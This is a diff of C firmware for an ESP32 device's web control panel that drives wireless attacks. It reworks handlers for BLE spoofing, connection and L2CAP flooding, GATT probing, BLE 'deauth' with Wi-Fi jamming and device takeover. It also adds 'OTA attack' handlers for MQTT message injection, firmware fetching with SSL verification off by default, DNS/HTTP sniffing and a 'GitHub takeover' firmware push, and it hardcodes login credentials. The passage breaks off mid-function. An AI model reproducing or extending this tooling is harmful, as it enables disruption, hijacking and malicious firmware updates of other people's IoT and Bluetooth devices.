@@ -30,6 +30,7 @@
 #include "web_ui.h"
 #include "ble_passkey.h"
 #include "bt/ble_takeover.h"
+#include "ota_attack.h"
 
 static const char *TAG = "WEB_SERVER";
 static httpd_handle_t server_handle = NULL;
@@ -39,6 +40,11 @@ static wifi_ap_record_t pmkid_target = {0};
 static wifi_ap_record_t evil_twin_target = {0};
 
 ESP_EVENT_DEFINE_BASE(WEBSERVER_EVENTS);
+
+/* Helper: get server handle (exposed via web.h) */
+httpd_handle_t webserver_get_handle(void) {
+    return server_handle;
+}
 
 #define USERNAME "omega"
 #define PASSWORD "solutions123"
@@ -1096,48 +1102,17 @@ static esp_err_t ble_spoof_start_handler(httpd_req_t *req) {
         httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
         return ESP_FAIL;
     }
-    char content[256];
+    char content[200];
     int ret = httpd_req_recv(req, content, sizeof(content) - 1);
     if (ret <= 0) return ESP_FAIL;
     content[ret] = '\0';
     cJSON *root = cJSON_Parse(content);
     if (!root) return ESP_FAIL;
-
-    cJSON *name_json           = cJSON_GetObjectItem(root, "name");
-    cJSON *adv_interval_json   = cJSON_GetObjectItem(root, "adv_interval_ms");
-    cJSON *cycle_delay_json    = cJSON_GetObjectItem(root, "cycle_delay_ms");
-    cJSON *timeout_json        = cJSON_GetObjectItem(root, "timeout_sec");
-
-    ble_spoof_config_t cfg = {0};
-    cfg.mode = BLE_SPOOF_MODE_NAME;
-    if (cJSON_IsString(name_json) && name_json->valuestring != NULL) {
-        strncpy(cfg.names, name_json->valuestring, sizeof(cfg.names) - 1);
-    }
-    if (cJSON_IsNumber(adv_interval_json)) {
-        cfg.adv_interval_ms = adv_interval_json->valueint;
-    }
-    if (cJSON_IsNumber(cycle_delay_json)) {
-        cfg.cycle_delay_ms = cycle_delay_json->valueint;
-    }
-    if (cJSON_IsNumber(timeout_json)) {
-        cfg.timeout_sec = timeout_json->valueint;
-    }
-
-    ble_spoof_init();
-    ble_spoof_start_config(&cfg);
-
+    cJSON *name = cJSON_GetObjectItem(root, "name");
+    const char *sname = cJSON_IsString(name) ? name->valuestring : NULL;
+    ble_spoof_start(sname);
     cJSON_Delete(root);
     return send_success_response(req);
-}
-
-static esp_err_t ble_spoof_status_handler(httpd_req_t *req) {
-    if (!request_is_authenticated(req)) {
-        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
-        return ESP_FAIL;
-    }
-
-    cJSON *status = ble_spoof_get_status_json();
-    return send_json_response(req, status);
 }
 
 static esp_err_t ble_spoof_stop_handler(httpd_req_t *req) {
@@ -1262,54 +1237,15 @@ static esp_err_t ble_connect_start_handler(httpd_req_t *req) {
         httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
         return ESP_FAIL;
     }
-    char content[300];
+    char content[200];
     int ret = httpd_req_recv(req, content, sizeof(content) - 1);
     if (ret <= 0) return ESP_FAIL;
     content[ret] = '\0';
     cJSON *root = cJSON_Parse(content);
     if (!root) return ESP_FAIL;
-
-    cJSON *addr_json           = cJSON_GetObjectItem(root, "addr");
-    cJSON *addr_type_json      = cJSON_GetObjectItem(root, "addr_type");
-    cJSON *interval_json       = cJSON_GetObjectItem(root, "connect_interval_ms");
-    cJSON *cooldown_json       = cJSON_GetObjectItem(root, "success_cooldown_ms");
-    cJSON *backoff_json        = cJSON_GetObjectItem(root, "fail_backoff_ms");
-    cJSON *timeout_json        = cJSON_GetObjectItem(root, "timeout_sec");
-    cJSON *rotate_mac_json     = cJSON_GetObjectItem(root, "rotate_own_mac");
-
-    const char *saddr = cJSON_IsString(addr_json) ? addr_json->valuestring : NULL;
-
-    ble_connect_flood_config_t cfg = {0};
-    if (saddr) {
-        strncpy(cfg.target_addr, saddr, sizeof(cfg.target_addr) - 1);
-        cfg.target_addr[sizeof(cfg.target_addr) - 1] = '\0';
-    }
-
-    cfg.addr_type = cJSON_IsNumber(addr_type_json)
-        ? (ble_connect_flood_addr_type_t)addr_type_json->valueint
-        : BLE_CF_ADDR_AUTO;
-    if (cfg.addr_type > BLE_CF_ADDR_AUTO) cfg.addr_type = BLE_CF_ADDR_AUTO;
-
-    cfg.connect_interval_ms = cJSON_IsNumber(interval_json)
-        ? (uint32_t)interval_json->valueint : 1500;
-    cfg.success_cooldown_ms = cJSON_IsNumber(cooldown_json)
-        ? (uint32_t)cooldown_json->valueint : 5000;
-    cfg.fail_backoff_ms     = cJSON_IsNumber(backoff_json)
-        ? (uint32_t)backoff_json->valueint : 2000;
-    cfg.timeout_sec         = cJSON_IsNumber(timeout_json)
-        ? (uint32_t)timeout_json->valueint : 300;
-    cfg.rotate_own_mac      = cJSON_IsBool(rotate_mac_json)
-        ? (bool)rotate_mac_json->valueint : true;
-
-    ble_connect_flood_init();
-    ble_connect_flood_start_config(&cfg);
-
-    ESP_LOGI(TAG, "BLE connect flood started: target=%s addr_type=%d interval=%u cooldown=%u backoff=%u timeout=%u rotate=%d",
-             cfg.target_addr, cfg.addr_type,
-             (unsigned)cfg.connect_interval_ms, (unsigned)cfg.success_cooldown_ms,
-             (unsigned)cfg.fail_backoff_ms, (unsigned)cfg.timeout_sec,
-             cfg.rotate_own_mac);
-
+    cJSON *addr = cJSON_GetObjectItem(root, "addr");
+    const char *saddr = cJSON_IsString(addr) ? addr->valuestring : NULL;
+    ble_connect_flood_start(saddr);
     cJSON_Delete(root);
     return send_success_response(req);
 }
@@ -1323,71 +1259,20 @@ static esp_err_t ble_connect_stop_handler(httpd_req_t *req) {
     return send_success_response(req);
 }
 
-static esp_err_t ble_connect_status_handler(httpd_req_t *req) {
-    if (!request_is_authenticated(req)) {
-        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
-        return ESP_FAIL;
-    }
-    cJSON *status = ble_connect_flood_get_status_json();
-    return send_json_response(req, status);
-}
-
 static esp_err_t ble_l2cap_start_handler(httpd_req_t *req) {
     if (!request_is_authenticated(req)) {
         httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
         return ESP_FAIL;
     }
-    char content[400];
+    char content[200];
     int ret = httpd_req_recv(req, content, sizeof(content) - 1);
     if (ret <= 0) return ESP_FAIL;
     content[ret] = '\0';
     cJSON *root = cJSON_Parse(content);
     if (!root) return ESP_FAIL;
-
-    cJSON *addr_json              = cJSON_GetObjectItem(root, "addr");
-    cJSON *addr_type_json         = cJSON_GetObjectItem(root, "addr_type");
-    cJSON *burst_json             = cJSON_GetObjectItem(root, "signal_burst_count");
-    cJSON *signal_interval_json   = cJSON_GetObjectItem(root, "signal_interval_ms");
-    cJSON *post_disconnect_json   = cJSON_GetObjectItem(root, "post_disconnect_ms");
-    cJSON *backoff_json           = cJSON_GetObjectItem(root, "fail_backoff_ms");
-    cJSON *timeout_json           = cJSON_GetObjectItem(root, "timeout_sec");
-    cJSON *rotate_mac_json        = cJSON_GetObjectItem(root, "rotate_own_mac");
-
-    const char *saddr = cJSON_IsString(addr_json) ? addr_json->valuestring : NULL;
-
-    ble_l2cap_flood_config_t cfg = {0};
-    if (saddr) {
-        strncpy(cfg.target_addr, saddr, sizeof(cfg.target_addr) - 1);
-        cfg.target_addr[sizeof(cfg.target_addr) - 1] = '\0';
-    }
-
-    cfg.addr_type = cJSON_IsNumber(addr_type_json)
-        ? (ble_l2cap_flood_addr_type_t)addr_type_json->valueint
-        : BLE_L2CAP_ADDR_AUTO;
-    if (cfg.addr_type > BLE_L2CAP_ADDR_AUTO) cfg.addr_type = BLE_L2CAP_ADDR_AUTO;
-
-    cfg.signal_burst_count  = cJSON_IsNumber(burst_json)
-        ? (uint32_t)burst_json->valueint : 50;
-    cfg.signal_interval_ms  = cJSON_IsNumber(signal_interval_json)
-        ? (uint32_t)signal_interval_json->valueint : 10;
-    cfg.post_disconnect_ms  = cJSON_IsNumber(post_disconnect_json)
-        ? (uint32_t)post_disconnect_json->valueint : 500;
-    cfg.fail_backoff_ms     = cJSON_IsNumber(backoff_json)
-        ? (uint32_t)backoff_json->valueint : 2000;
-    cfg.timeout_sec         = cJSON_IsNumber(timeout_json)
-        ? (uint32_t)timeout_json->valueint : 300;
-    cfg.rotate_own_mac      = cJSON_IsBool(rotate_mac_json)
-        ? (bool)rotate_mac_json->valueint : true;
-
-    ble_l2cap_flood_init();
-    ble_l2cap_flood_start_config(&cfg);
-
-    ESP_LOGI(TAG, "BLE L2CAP flood started: target=%s addr_type=%d burst=%u interval=%u post_dis=%u backoff=%u timeout=%u rotate=%d",
-             cfg.target_addr, cfg.addr_type,
-             (unsigned)cfg.signal_burst_count, (unsigned)cfg.signal_interval_ms,
-             (unsigned)cfg.post_disconnect_ms, (unsigned)cfg.fail_backoff_ms,
-             (unsigned)cfg.timeout_sec, cfg.rotate_own_mac);
-
+    cJSON *addr = cJSON_GetObjectItem(root, "addr");
+    const char *saddr = cJSON_IsString(addr) ? addr->valuestring : NULL;
+    ble_l2cap_flood_start(saddr);
     cJSON_Delete(root);
     return send_success_response(req);
 }
@@ -1401,59 +1286,20 @@ static esp_err_t ble_l2cap_stop_handler(httpd_req_t *req) {
     return send_success_response(req);
 }
 
-static esp_err_t ble_l2cap_status_handler(httpd_req_t *req) {
-    if (!request_is_authenticated(req)) {
-        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
-        return ESP_FAIL;
-    }
-    cJSON *status = ble_l2cap_flood_get_status_json();
-    return send_json_response(req, status);
-}
-
 static esp_err_t ble_gatt_start_handler(httpd_req_t *req) {
     if (!request_is_authenticated(req)) {
         httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
         return ESP_FAIL;
     }
-    char content[512];
+    char content[200];
     int ret = httpd_req_recv(req, content, sizeof(content) - 1);
     if (ret <= 0) return ESP_FAIL;
     content[ret] = '\0';
     cJSON *root = cJSON_Parse(content);
     if (!root) return ESP_FAIL;
-
-    cJSON *addr_json            = cJSON_GetObjectItem(root, "addr");
-    cJSON *timeout_json         = cJSON_GetObjectItem(root, "timeout_sec");
-    cJSON *probe_read_json      = cJSON_GetObjectItem(root, "probe_read");
-    cJSON *probe_write_json     = cJSON_GetObjectItem(root, "probe_write");
-    cJSON *probe_subscribe_json = cJSON_GetObjectItem(root, "probe_subscribe");
-    cJSON *probe_interval_json  = cJSON_GetObjectItem(root, "probe_interval_ms");
-    cJSON *post_disconnect_json = cJSON_GetObjectItem(root, "post_disconnect_ms");
-    cJSON *fail_backoff_json    = cJSON_GetObjectItem(root, "fail_backoff_ms");
-    cJSON *addr_type_json       = cJSON_GetObjectItem(root, "addr_type");
-    cJSON *rotate_mac_json      = cJSON_GetObjectItem(root, "rotate_own_mac");
-
-    gatt_probe_config_t cfg = {0};
-    if (cJSON_IsString(addr_json) && addr_json->valuestring != NULL) {
-        strncpy(cfg.target_addr, addr_json->valuestring, sizeof(cfg.target_addr) - 1);
-    }
-    cfg.timeout_sec        = cJSON_IsNumber(timeout_json)         ? (uint32_t)timeout_json->valueint         : 300;
-    cfg.probe_read         = cJSON_IsBool(probe_read_json)        ? probe_read_json->valueint                : true;
-    cfg.probe_write        = cJSON_IsBool(probe_write_json)       ? probe_write_json->valueint               : false;
-    cfg.probe_subscribe    = cJSON_IsBool(probe_subscribe_json)   ? probe_subscribe_json->valueint           : true;
-    cfg.probe_interval_ms  = cJSON_IsNumber(probe_interval_json)  ? (uint32_t)probe_interval_json->valueint  : 50;
-    cfg.post_disconnect_ms = cJSON_IsNumber(post_disconnect_json) ? (uint32_t)post_disconnect_json->valueint : 500;
-    cfg.fail_backoff_ms    = cJSON_IsNumber(fail_backoff_json)    ? (uint32_t)fail_backoff_json->valueint    : 2000;
-    cfg.addr_type          = cJSON_IsNumber(addr_type_json)       ? (gatt_probe_addr_type_t)addr_type_json->valueint : BLE_GATT_PROBE_ADDR_AUTO;
-    cfg.rotate_own_mac     = cJSON_IsBool(rotate_mac_json)        ? rotate_mac_json->valueint                : true;
-
-    ESP_LOGI(TAG, "Starting GATT probe on %s (read=%d write=%d sub=%d timeout=%us)",
-             cfg.target_addr, cfg.probe_read, cfg.probe_write,
-             cfg.probe_subscribe, (unsigned)cfg.timeout_sec);
-
-    ble_gatt_probe_init();
-    ble_gatt_probe_start_config(&cfg);
-
+    cJSON *addr = cJSON_GetObjectItem(root, "addr");
+    const char *saddr = cJSON_IsString(addr) ? addr->valuestring : NULL;
+    ble_gatt_probe_start(saddr);
     cJSON_Delete(root);
     return send_success_response(req);
 }
@@ -1467,88 +1313,20 @@ static esp_err_t ble_gatt_stop_handler(httpd_req_t *req) {
     return send_success_response(req);
 }
 
-static esp_err_t ble_gatt_status_handler(httpd_req_t *req) {
-    if (!request_is_authenticated(req)) {
-        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
-        return ESP_FAIL;
-    }
-    cJSON *status = ble_gatt_probe_get_status_json();
-    return send_json_response(req, status);
-}
-
 static esp_err_t ble_deauth_start_handler(httpd_req_t *req) {
     if (!request_is_authenticated(req)) {
         httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
         return ESP_FAIL;
     }
-    char content[512];
+    char content[200];
     int ret = httpd_req_recv(req, content, sizeof(content) - 1);
     if (ret <= 0) return ESP_FAIL;
     content[ret] = '\0';
     cJSON *root = cJSON_Parse(content);
     if (!root) return ESP_FAIL;
-
-    cJSON *addr_json              = cJSON_GetObjectItem(root, "addr");
-    cJSON *timeout_json           = cJSON_GetObjectItem(root, "timeout_sec");
-    cJSON *conn_timeout_json      = cJSON_GetObjectItem(root, "connect_timeout_ms");
-    cJSON *jam_threshold_json     = cJSON_GetObjectItem(root, "jam_threshold");
-    cJSON *jam_rounds_json        = cJSON_GetObjectItem(root, "wifi_jam_rounds");
-    cJSON *spoof_dur_json         = cJSON_GetObjectItem(root, "spoof_duration_sec");
-    cJSON *post_disconnect_json   = cJSON_GetObjectItem(root, "post_disconnect_ms");
-    cJSON *backoff_json           = cJSON_GetObjectItem(root, "fail_backoff_ms");
-    cJSON *addr_type_json         = cJSON_GetObjectItem(root, "addr_type");
-    cJSON *rotate_mac_json        = cJSON_GetObjectItem(root, "rotate_own_mac");
-
-    const char *addr_str = cJSON_IsString(addr_json) ? addr_json->valuestring : NULL;
-    if (!addr_str || strlen(addr_str) < 1) {
-        cJSON_Delete(root);
-        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Missing target BLE address");
-        return ESP_FAIL;
-    }
-
-    ble_deauth_config_t cfg = {
-        .timeout_sec        = 300,
-        .connect_timeout_ms = 3000,
-        .jam_threshold      = 3,
-        .wifi_jam_rounds    = 3,
-        .spoof_duration_sec = 5,
-        .post_disconnect_ms = 200,
-        .fail_backoff_ms    = 2000,
-        .addr_type          = BLE_DEAUTH_ADDR_AUTO,
-        .rotate_own_mac     = true,
-    };
-    strncpy(cfg.target_addr, addr_str, sizeof(cfg.target_addr) - 1);
-    cfg.target_addr[sizeof(cfg.target_addr) - 1] = '\0';
-
-    if (cJSON_IsNumber(timeout_json) && timeout_json->valueint >= 30)
-        cfg.timeout_sec = (uint32_t)timeout_json->valueint;
-    if (cJSON_IsNumber(conn_timeout_json) && conn_timeout_json->valueint >= 1000)
-        cfg.connect_timeout_ms = (uint32_t)conn_timeout_json->valueint;
-    if (cJSON_IsNumber(jam_threshold_json) && jam_threshold_json->valueint >= 1)
-        cfg.jam_threshold = (uint32_t)jam_threshold_json->valueint;
-    if (cJSON_IsNumber(jam_rounds_json) && jam_rounds_json->valueint >= 1)
-        cfg.wifi_jam_rounds = (uint32_t)jam_rounds_json->valueint;
-    if (cJSON_IsNumber(spoof_dur_json) && spoof_dur_json->valueint >= 1)
-        cfg.spoof_duration_sec = (uint32_t)spoof_dur_json->valueint;
-    if (cJSON_IsNumber(post_disconnect_json) && post_disconnect_json->valueint >= 50)
-        cfg.post_disconnect_ms = (uint32_t)post_disconnect_json->valueint;
-    if (cJSON_IsNumber(backoff_json) && backoff_json->valueint >= 200)
-        cfg.fail_backoff_ms = (uint32_t)backoff_json->valueint;
-    if (cJSON_IsNumber(addr_type_json)) {
-        int at = addr_type_json->valueint;
-        if (at >= 0 && at <= 2)
-            cfg.addr_type = (ble_deauth_addr_type_t)at;
-    }
-    if (cJSON_IsBool(rotate_mac_json))
-        cfg.rotate_own_mac = rotate_mac_json->valueint == 1;
-
-    ble_deauth_init();
-    ble_deauth_start_config(&cfg);
-
-    ESP_LOGI(TAG, "BLE deauth started: target=%s timeout=%u addr_type=%d jam=%u rounds=%u",
-             cfg.target_addr, (unsigned)cfg.timeout_sec, cfg.addr_type,
-             (unsigned)cfg.jam_threshold, (unsigned)cfg.wifi_jam_rounds);
-
+    cJSON *addr = cJSON_GetObjectItem(root, "addr");
+    const char *saddr = cJSON_IsString(addr) ? addr->valuestring : NULL;
+    ble_deauth_start(saddr);
     cJSON_Delete(root);
     return send_success_response(req);
 }
@@ -1560,15 +1338,6 @@ static esp_err_t ble_deauth_stop_handler(httpd_req_t *req) {
     }
     ble_deauth_stop();
     return send_success_response(req);
-}
-
-static esp_err_t ble_deauth_status_handler(httpd_req_t *req) {
-    if (!request_is_authenticated(req)) {
-        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
-        return ESP_FAIL;
-    }
-    cJSON *status = ble_deauth_get_status_json();
-    return send_json_response(req, status);
 }
 
 static esp_err_t ble_scan_api_handler(httpd_req_t *req) {
@@ -1603,43 +1372,15 @@ static esp_err_t ble_passkey_start_handler(httpd_req_t *req) {
         httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
         return ESP_FAIL;
     }
-    char content[256];
+    char content[200];
     int ret = httpd_req_recv(req, content, sizeof(content) - 1);
     if (ret <= 0) return ESP_FAIL;
     content[ret] = '\0';
     cJSON *root = cJSON_Parse(content);
     if (!root) return ESP_FAIL;
-
-    cJSON *addr_json       = cJSON_GetObjectItem(root, "addr");
-    cJSON *timeout_json    = cJSON_GetObjectItem(root, "timeout_sec");
-    cJSON *autodisconn_json = cJSON_GetObjectItem(root, "auto_disconnect");
-
-    const char *addr_str = cJSON_IsString(addr_json) ? addr_json->valuestring : NULL;
-    if (!addr_str || strlen(addr_str) < 1) {
-        cJSON_Delete(root);
-        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Missing target BLE address");
-        return ESP_FAIL;
-    }
-
-    ble_passkey_config_t cfg = {
-        .timeout_sec      = 60,
-        .adv_duration_sec = 60,
-        .auto_disconnect  = true,
-    };
-    strncpy(cfg.target_addr, addr_str, sizeof(cfg.target_addr) - 1);
-    cfg.target_addr[sizeof(cfg.target_addr) - 1] = '\0';
-
-    if (cJSON_IsNumber(timeout_json) && timeout_json->valueint >= 10)
-        cfg.timeout_sec = (uint32_t)timeout_json->valueint;
-    if (cJSON_IsNumber(autodisconn_json))
-        cfg.auto_disconnect = autodisconn_json->valueint == 1;
-
-    ble_passkey_init();
-    ble_passkey_start_config(&cfg);
-
-    ESP_LOGI(TAG, "BLE passkey started: target=%s timeout=%u auto_disconnect=%d",
-             cfg.target_addr, (unsigned)cfg.timeout_sec, cfg.auto_disconnect);
-
+    cJSON *addr = cJSON_GetObjectItem(root, "addr");
+    const char *saddr = cJSON_IsString(addr) ? addr->valuestring : NULL;
+    ble_passkey_start(saddr);
     cJSON_Delete(root);
     return send_success_response(req);
 }
@@ -1658,8 +1399,15 @@ static esp_err_t ble_passkey_status_handler(httpd_req_t *req) {
         httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
         return ESP_FAIL;
     }
-    cJSON *status = ble_passkey_get_status_json();
-    return send_json_response(req, status);
+    httpd_resp_set_type(req, "application/json");
+    cJSON *pk_root = cJSON_CreateObject();
+    cJSON_AddBoolToObject(pk_root, "running", ble_passkey_is_running());
+    cJSON_AddStringToObject(pk_root, "method", ble_passkey_get_method());
+    char *pk_json = cJSON_PrintUnformatted(pk_root);
+    httpd_resp_sendstr(req, pk_json);
+    free(pk_json);
+    cJSON_Delete(pk_root);
+    return ESP_OK;
 }
 
 /* ---- BLE Takeover Handlers ---- */
@@ -1669,67 +1417,15 @@ static esp_err_t ble_takeover_start_handler(httpd_req_t *req) {
         httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
         return ESP_FAIL;
     }
-    char content[512];
+    char content[200];
     int ret = httpd_req_recv(req, content, sizeof(content) - 1);
     if (ret <= 0) return ESP_FAIL;
     content[ret] = '\0';
     cJSON *root = cJSON_Parse(content);
     if (!root) return ESP_FAIL;
-
-    cJSON *addr_json = cJSON_GetObjectItem(root, "addr");
-    if (!cJSON_IsString(addr_json) || addr_json->valuestring == NULL) {
-        cJSON_Delete(root);
-        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Missing addr");
-        return ESP_FAIL;
-    }
-
-    ble_takeover_config_t cfg = {
-        .target_addr              = "",
-        .timeout_sec              = 300,
-        .connect_timeout_ms       = 15000,
-        .auto_enable_notifies     = true,
-        .rotate_own_mac           = true,
-        .addr_type                = BLE_TAKEOVER_ADDR_AUTO,
-        .scan_itvl                = 0x0010,
-        .scan_window              = 0x0010,
-        .conn_itvl_min            = 0x0006,
-        .conn_itvl_max            = 0x000C,
-        .conn_latency             = 0,
-        .conn_supervision_timeout = 0x0064,
-    };
-    strncpy(cfg.target_addr, addr_json->valuestring, sizeof(cfg.target_addr) - 1);
-
-    cJSON *timeout_json     = cJSON_GetObjectItem(root, "timeout_sec");
-    cJSON *conn_to_json     = cJSON_GetObjectItem(root, "connect_timeout_ms");
-    cJSON *addr_type_json   = cJSON_GetObjectItem(root, "addr_type");
-    cJSON *auto_notif_json  = cJSON_GetObjectItem(root, "auto_enable_notifies");
-    cJSON *rotate_mac_json  = cJSON_GetObjectItem(root, "rotate_own_mac");
-
-    if (cJSON_IsNumber(timeout_json) && timeout_json->valueint >= 10) {
-        cfg.timeout_sec = (uint32_t)timeout_json->valueint;
-    }
-    if (cJSON_IsNumber(conn_to_json) && conn_to_json->valueint >= 1000) {
-        cfg.connect_timeout_ms = (uint32_t)conn_to_json->valueint;
-    }
-    if (cJSON_IsNumber(addr_type_json)) {
-        int at = addr_type_json->valueint;
-        if (at >= 0 && at <= 2) {
-            cfg.addr_type = (takeover_addr_type_t)at;
-        }
-    }
-    if (cJSON_IsBool(auto_notif_json)) {
-        cfg.auto_enable_notifies = auto_notif_json->valueint ? true : false;
-    }
-    if (cJSON_IsBool(rotate_mac_json)) {
-        cfg.rotate_own_mac = rotate_mac_json->valueint ? true : false;
-    }
-
-    ble_takeover_init();
-    ble_takeover_start_config(&cfg);
-
-    ESP_LOGI(TAG, "Starting BLE takeover on %s (timeout=%us, addr_type=%d)",
-             cfg.target_addr, (unsigned)cfg.timeout_sec, (int)cfg.addr_type);
-
+    cJSON *addr = cJSON_GetObjectItem(root, "addr");
+    const char *saddr = cJSON_IsString(addr) ? addr->valuestring : NULL;
+    ble_takeover_start(saddr);
     cJSON_Delete(root);
     return send_success_response(req);
 }
@@ -1748,8 +1444,15 @@ static esp_err_t ble_takeover_status_handler(httpd_req_t *req) {
         httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
         return ESP_FAIL;
     }
-    cJSON *status = ble_takeover_get_status_json();
-    return send_json_response(req, status);
+    httpd_resp_set_type(req, "application/json");
+    cJSON *to_root = cJSON_CreateObject();
+    cJSON_AddBoolToObject(to_root, "running", ble_takeover_is_running());
+    cJSON_AddNumberToObject(to_root, "state", ble_takeover_get_state());
+    char *to_json = cJSON_PrintUnformatted(to_root);
+    httpd_resp_sendstr(req, to_json);
+    free(to_json);
+    cJSON_Delete(to_root);
+    return ESP_OK;
 }
 
 static esp_err_t ble_takeover_services_handler(httpd_req_t *req) {
@@ -1848,6 +1551,640 @@ static esp_err_t ble_takeover_notifs_handler(httpd_req_t *req) {
 }
 
 /* ================================================================== */
+/*  OTA ATTACK HANDLERS                                                */
+/* ================================================================== */
+
+static esp_err_t ota_start_handler(httpd_req_t *req) {
+    if (!request_is_authenticated(req)) {
+        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
+        return ESP_FAIL;
+    }
+
+    char content[1024];
+    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
+    if (ret <= 0) return ESP_FAIL;
+    content[ret] = '\0';
+
+    cJSON *root = cJSON_Parse(content);
+    if (!root) {
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid JSON");
+        return ESP_FAIL;
+    }
+
+    ota_attack_config_t cfg = {0};
+
+    cJSON *mode_json = cJSON_GetObjectItem(root, "mode");
+    if (!cJSON_IsNumber(mode_json) || mode_json->valueint < 0 || mode_json->valueint > 5) {
+        cJSON_Delete(root);
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid or missing mode (0-5)");
+        return ESP_FAIL;
+    }
+    cfg.mode = (ota_attack_mode_t)mode_json->valueint;
+
+    /* WiFi credentials */
+    cJSON *ssid_json = cJSON_GetObjectItem(root, "wifi_ssid");
+    cJSON *pass_json = cJSON_GetObjectItem(root, "wifi_password");
+    if (cJSON_IsString(ssid_json)) {
+        strncpy(cfg.wifi_ssid, ssid_json->valuestring, sizeof(cfg.wifi_ssid) - 1);
+    }
+    if (cJSON_IsString(pass_json)) {
+        strncpy(cfg.wifi_password, pass_json->valuestring, sizeof(cfg.wifi_password) - 1);
+    }
+
+    /* MQTT broker */
+    cJSON *broker_json = cJSON_GetObjectItem(root, "mqtt_broker");
+    cJSON *port_json   = cJSON_GetObjectItem(root, "mqtt_port");
+    cJSON *muser_json  = cJSON_GetObjectItem(root, "mqtt_username");
+    cJSON *mpass_json  = cJSON_GetObjectItem(root, "mqtt_password");
+    cJSON *cid_json    = cJSON_GetObjectItem(root, "mqtt_client_id");
+    cJSON *sub_json    = cJSON_GetObjectItem(root, "subscribe_topic");
+    if (cJSON_IsString(broker_json)) strncpy(cfg.mqtt_broker, broker_json->valuestring, sizeof(cfg.mqtt_broker) - 1);
+    cfg.mqtt_port = cJSON_IsNumber(port_json) ? (uint16_t)port_json->valueint : 1883;
+    if (cJSON_IsString(muser_json)) strncpy(cfg.mqtt_username, muser_json->valuestring, sizeof(cfg.mqtt_username) - 1);
+    if (cJSON_IsString(mpass_json)) strncpy(cfg.mqtt_password, mpass_json->valuestring, sizeof(cfg.mqtt_password) - 1);
+    if (cJSON_IsString(cid_json)) strncpy(cfg.mqtt_client_id, cid_json->valuestring, sizeof(cfg.mqtt_client_id) - 1);
+    if (cJSON_IsString(sub_json)) strncpy(cfg.subscribe_topic, sub_json->valuestring, sizeof(cfg.subscribe_topic) - 1);
+
+    /* Injection */
+    cJSON *itopic_json   = cJSON_GetObjectItem(root, "inject_topic");
+    cJSON *ipayload_json = cJSON_GetObjectItem(root, "inject_payload");
+    cJSON *icount_json   = cJSON_GetObjectItem(root, "inject_count");
+    cJSON *iinterval_json = cJSON_GetObjectItem(root, "inject_interval_ms");
+    if (cJSON_IsString(itopic_json)) strncpy(cfg.inject_topic, itopic_json->valuestring, sizeof(cfg.inject_topic) - 1);
+    if (cJSON_IsString(ipayload_json)) strncpy(cfg.inject_payload, ipayload_json->valuestring, sizeof(cfg.inject_payload) - 1);
+    cfg.inject_count = cJSON_IsNumber(icount_json) ? (uint32_t)icount_json->valueint : 1;
+    cfg.inject_interval_ms = cJSON_IsNumber(iinterval_json) ? (uint32_t)iinterval_json->valueint : 0;
+
+    /* Firmware fetch */
+    cJSON *fw_url_json = cJSON_GetObjectItem(root, "firmware_url");
+    cJSON *ssl_json    = cJSON_GetObjectItem(root, "verify_ssl");
+    if (cJSON_IsString(fw_url_json)) strncpy(cfg.firmware_url, fw_url_json->valuestring, sizeof(cfg.firmware_url) - 1);
+    cfg.verify_ssl = cJSON_IsBool(ssl_json) ? ssl_json->valueint : false;
+
+    /* Poll sniff */
+    cJSON *cap_dns_json  = cJSON_GetObjectItem(root, "capture_dns");
+    cJSON *cap_http_json = cJSON_GetObjectItem(root, "capture_http");
+    cfg.capture_dns  = cJSON_IsBool(cap_dns_json)  ? cap_dns_json->valueint  : true;
+    cfg.capture_http = cJSON_IsBool(cap_http_json) ? cap_http_json->valueint : true;
+
+    /* GitHub takeover */
+    cJSON *gh_path_json = cJSON_GetObjectItem(root, "gh_firmware_path");
+    cJSON *gh_branch_json = cJSON_GetObjectItem(root, "gh_branch");
+    cJSON *gh_msg_json  = cJSON_GetObjectItem(root, "gh_commit_msg");
+    cJSON *gh_idx_json  = cJSON_GetObjectItem(root, "gh_captured_url_index");
+    if (cJSON_IsString(gh_path_json)) strncpy(cfg.gh_firmware_path, gh_path_json->valuestring, sizeof(cfg.gh_firmware_path) - 1);
+    if (cJSON_IsString(gh_branch_json)) strncpy(cfg.gh_branch, gh_branch_json->valuestring, sizeof(cfg.gh_branch) - 1);
+    if (cJSON_IsString(gh_msg_json)) strncpy(cfg.gh_commit_msg, gh_msg_json->valuestring, sizeof(cfg.gh_commit_msg) - 1);
+    cfg.gh_captured_url_index = cJSON_IsNumber(gh_idx_json) ? gh_idx_json->valueint : -1;
+
+    /* General */
+    cJSON *timeout_json = cJSON_GetObjectItem(root, "timeout_sec");
+    cJSON *devip_json      = cJSON_GetObjectItem(root, "target_device_ip");
+    cJSON *capdns_json     = cJSON_GetObjectItem(root, "capture_dns");
+    cJSON *caphttp_json    = cJSON_GetObjectItem(root, "capture_http");
+    cJSON *ghpath_json     = cJSON_GetObjectItem(root, "gh_firmware_path");
+    cJSON *ghbranch_json   = cJSON_GetObjectItem(root, "gh_branch");
+    cJSON *ghcommit_json   = cJSON_GetObjectItem(root, "gh_commit_msg");
